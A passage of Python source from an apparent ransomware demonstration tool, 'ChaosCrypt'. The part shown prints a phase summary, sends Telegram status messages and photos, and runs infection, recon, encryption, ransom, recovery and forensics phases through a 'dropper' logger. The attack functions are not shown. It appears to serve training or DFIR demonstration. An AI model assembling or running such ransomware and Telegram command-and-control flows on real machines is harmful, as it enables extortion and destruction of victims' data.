    s3 = "-> Ransom + Negotiation + Payment"
    s4 = "-> Key Delivery + Decryption"
    s5 = "-> DFIR Forensic Report"
    print(f"  ║  {s1:<{IW - 2}}║")
    print(f"  ║  {s2:<{IW - 2}}║")
    print(f"  ║  {s3:<{IW - 2}}║")
    print(f"  ║  {s4:<{IW - 2}}║")
    print(f"  ║  {s5:<{IW - 2}}║")
    print(f"  ║{' ' * IW}║")
    print(f"  ╠{'═' * IW}╣")
    d1 = f"  Duration:    {dur_str}"
    d2 = f"  Algorithm:   AES-256-CBC"
    d3 = f"  C2 Channel:  Telegram (real-time)"
    d4 = f"  Manual input: 1 click"
    d5 = f"  Recovery:    100% (SHA256 verified)"
    print(f"  ║{d1:<{IW}}║")
    print(f"  ║{d2:<{IW}}║")
    print(f"  ║{d3:<{IW}}║")
    print(f"  ║{d4:<{IW}}║")
    print(f"  ║{d5:<{IW}}║")
    print(f"  ║{' ' * IW}║")
    print(f"  ╚{'═' * IW}╝")

    logger.log_event("finish", "Demonstration complete",
                     metadata={"duration_sec": round(duration, 1),
                               "session": session_id})
    tg(f"✅ <b>ChaosCrypt demo complete!</b>\n"
       f"<code>Duration: {dur_str}\n"
       f"Session: VICTIM-{sid6}</code>")

    success_img = os.path.join(ASSETS_DIR, IMG_SUCCESS)
    if send_photo and os.path.isfile(success_img):
        send_photo(success_img,
                   caption="🎉 <b>ChaosCrypt: Demo Complete</b>",
                   parse_mode="HTML", async_mode=False)

    input("\n  Press Enter to exit...")

def main():
    start_time = time.time()
    logger = LogBook(phase="dropper")

    try:
        session_id = phase_infection(logger)
        targets    = phase_recon(logger, session_id)
        show_key, n_show, n_stealth = phase_encryption(
            logger, targets)
        keys_file  = phase_ransom(
            logger, show_key, n_show, n_stealth, session_id)
        phase_recovery(logger, keys_file, session_id)
        phase_dfir(logger, session_id, start_time)
    except KeyboardInterrupt:
        print("\n\n  [!] Demo interrupted by user.")
        logger.log_event("error", "Demo interrupted by user")
    except Exception as e:
        print(f"\n\n  [FATAL] {e}")
        logger.log_event("error", f"Fatal: {e}")
        import traceback
        traceback.print_exc()
    finally:
        logger.close()

if __name__ == "__main__":
    main()